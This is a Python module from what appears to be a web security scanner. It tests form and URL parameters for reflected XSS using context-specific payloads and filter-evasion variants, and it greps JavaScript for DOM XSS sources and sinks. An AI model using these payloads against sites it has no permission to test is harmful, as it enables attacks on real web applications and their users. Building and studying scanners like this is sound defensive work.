from typing import Optional
"""
Module: XSS Detection
----------------------
Covers reflected, stored, DOM-based, and blind XSS.
Uses context-aware payloads — HTML, attribute, JS, URL contexts.
Chains from recon module's forms and endpoints.

Detection:
  - Reflected: unique canary reflected unencoded in response
  - Context detection: HTML body / attribute / JS / CSS / URL context
  - DOM: looks for dangerous sinks in JS source
  - CSP: detects weak/missing CSP that allows XSS
  - Filter evasion: browser-specific payloads when basic ones blocked
"""

import re
import html
import urllib.parse
from ..core import ScanContext, Finding, http_request, R, G, Y, C, DIM, BOLD, RST

MODULE_NAME = "xss"

# Canary marker
CANARY = "z33xsscanary"

# Context-aware XSS payloads
PAYLOADS_HTML = [
    f'<{CANARY}>',
    f'<img src=x onerror=alert("{CANARY}")>',
    f'<svg onload=alert("{CANARY}")>',
    f'<script>alert("{CANARY}")</script>',
    f'<body onload=alert("{CANARY}")>',
    f'<details open ontoggle=alert("{CANARY}")>',
    f'<iframe src="javascript:alert(\'{CANARY}\')">',
    f'<math><mtext></table><img src onerror=alert("{CANARY}")>',
    f'<svg><animate onbegin=alert("{CANARY}") attributeName=x>',
]

PAYLOADS_ATTR = [
    f'" onmouseover="alert(\'{CANARY}\')',
    f'\' onmouseover=\'alert("{CANARY}")',
    f'" autofocus onfocus="alert(\'{CANARY}\')',
    f'"><script>alert("{CANARY}")</script>',
    f'" onclick="alert(\'{CANARY}\')" x="',
    f"javascript:alert('{CANARY}')",
]

PAYLOADS_JS = [
    f'";alert("{CANARY}");//',
    f"';alert('{CANARY}');//",
    f'`${{alert("{CANARY}")}}',
    f'\\";alert("{CANARY}");//',
    f'</script><script>alert("{CANARY}")</script>',
]

PAYLOADS_WAF_BYPASS = [
    f'<ImG sRc=x OnErRoR=alert("{CANARY}")>',
    f'<svg/onload=alert("{CANARY}")>',
    f'<script>alert`{CANARY}`</script>',
    f'<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>',
    f'<<script>alert("{CANARY}")//<</script>',
    f'<scr<script>ipt>alert("{CANARY}")</scr</script>ipt>',
    f'%3cscript%3ealert("{CANARY}")%3c/script%3e',
    f'<script>eval(atob("YWxlcnQoMSk="))</script>',  # base64 alert(1)
]

# DOM XSS sinks to look for in JS
DOM_SINKS = [
    r'document\.write\s*\(',
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'eval\s*\(',
    r'setTimeout\s*\(',
    r'setInterval\s*\(',
    r'new\s+Function\s*\(',
    r'\.insertAdjacentHTML\s*\(',
    r'location\.href\s*=',
    r'location\.replace\s*\(',
    r'location\.assign\s*\(',
    r'window\.location\s*=',
]

# DOM XSS sources
DOM_SOURCES = [
    r'location\.search',
    r'location\.hash',
    r'location\.href',
    r'document\.URL',
    r'document\.referrer',
    r'window\.name',
    r'document\.cookie',
    r'localStorage\.',
    r'sessionStorage\.',
]


def _detect_context(body: str, canary: str) -> str:
    """Detect injection context from where canary appears."""
    pos = body.find(canary)
    if pos == -1:
        return "none"

    surrounding = body[max(0, pos - 100):pos + len(canary) + 100]

    # Inside <script>
    if re.search(r'<script[^>]*>.*' + re.escape(canary), body[:pos + len(canary)], re.S):
        return "js"

    # Inside HTML attribute
    if re.search(r'["\']' + re.escape(canary), surrounding):
        return "attribute"

    # Inside URL (href, src, action)
    if re.search(r'(?:href|src|action)=["\'][^"\']*' + re.escape(canary), body):
        return "url"

    # Raw HTML context
    return "html"


def _is_reflected_unencoded(body: str, payload: str) -> bool:
    """Check if payload is reflected without HTML encoding."""
    if payload not in body:
        return False
    # Make sure it's not entity-encoded
    if html.escape(payload) in body and payload not in body.replace(html.escape(payload), ""):
        return False
    return True


def _test_param(ctx: ScanContext, url: str, param: str,
                 method: str = "GET", existing_params: dict = None) -> list:
    """Test a single parameter for XSS."""
    findings = []
    all_payloads = PAYLOADS_HTML + PAYLOADS_ATTR + PAYLOADS_JS

    for payload in all_payloads:
        test_params = {**(existing_params or {}), param: payload}

        if method == "GET":
            qs       = urllib.parse.urlencode(test_params)
            test_url = url.split("?")[0] + "?" + qs
            resp     = ctx.request(test_url)
        else:
            resp = ctx.request(url, method="POST", data=test_params)

        if resp["status"] == 0:
            continue

        if _is_reflected_unencoded(resp["body"], CANARY):
            context = _detect_context(resp["body"], CANARY)
            findings.append(Finding(
                module      = MODULE_NAME,
                title       = f"Reflected XSS — {context} context",
                severity    = "High",
                url         = test_url if method == "GET" else url,
                detail      = f"Parameter '{param}' reflects unsanitized input in {context} context",
                evidence    = f"Payload: {payload[:80]}",
                remediation = "HTML-encode all user input. Implement strict CSP. Use context-aware output encoding.",
                cvss        = 6.1,
                extra       = {"param": param, "payload": payload,
                               "context": context, "method": method},
            ))
            return findings  # one confirmed per param is enough

    return findings


def check_dom_xss(ctx: ScanContext) -> list:
    """Check JS files for DOM XSS sinks + sources."""
    findings = []

    for js_url in ctx.js_files[:10]:
        resp = ctx.request(js_url)
        if resp["status"] != 200:
            continue

        js = resp["body"]
        found_sources = [s for s in DOM_SOURCES if re.search(s, js)]
        found_sinks   = [s for s in DOM_SINKS   if re.search(s, js)]

        if found_sources and found_sinks:
            findings.append(Finding(
                module   = MODULE_NAME,
                title    = "Potential DOM XSS",
                severity = "Medium",
                url      = js_url,
                detail   = (f"JS file contains both DOM sources and sinks. "
                             f"Sources: {found_sources[:2]} | Sinks: {found_sinks[:2]}"),
                evidence = f"File: {js_url}",
                remediation = "Sanitize data before passing to DOM sinks. Use textContent instead of innerHTML.",
                cvss     = 5.4,
                extra    = {"sources": found_sources, "sinks": found_sinks},
            ))

    return findings


def run(ctx: ScanContext) -> ScanContext:
    """Run XSS detection module."""

    if ctx.verbose:
        print(f"\n{C}{BOLD}[MODULE: XSS]{RST}")

    all_findings = []

    # Test forms from recon
    for form in ctx.forms[:10]:
        action = form.get("action", ctx.target)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])

        existing = {i["name"]: i.get("value", "test") for i in inputs
                    if i.get("type") != "submit"}

        for inp in inputs:
            if inp.get("type") in ("submit", "hidden", "button"):
                continue
            name = inp["name"]
            if ctx.verbose:
                print(f"  {DIM}[~] Testing form param: {name}{RST}", end="\r")

            found = _test_param(ctx, action, name, method, existing)
            all_findings.extend(found)

    # Test URL params from discovered endpoints
    import urllib.parse as up
    for endpoint in ctx.endpoints[:20]:
        parsed = up.urlparse(endpoint)
        params = dict(up.parse_qsl(parsed.query))
        for param in params:
            if ctx.verbose:
                print(f"  {DIM}[~] Testing URL param: {param}{RST}", end="\r")
            found = _test_param(ctx, endpoint, param, "GET", params)
            all_findings.extend(found)

    # DOM XSS check
    dom_findings = check_dom_xss(ctx)
    all_findings.extend(dom_findings)

    if ctx.verbose:
        print(f"\r{' '*60}\r", end="")

    ctx.add_findings(all_findings)
    ctx.module_results["xss"] = {
        "tested_params": len(ctx.forms) + len(ctx.endpoints),
        "findings":      len(all_findings),
    }

    # Chain hints
    if any(f.severity in ("High", "Critical") for f in all_findings):
        ctx.add_chain_hint("xss", "csp_bypass",
                            "XSS found — check if CSP prevents exploitation", {})

    return ctx
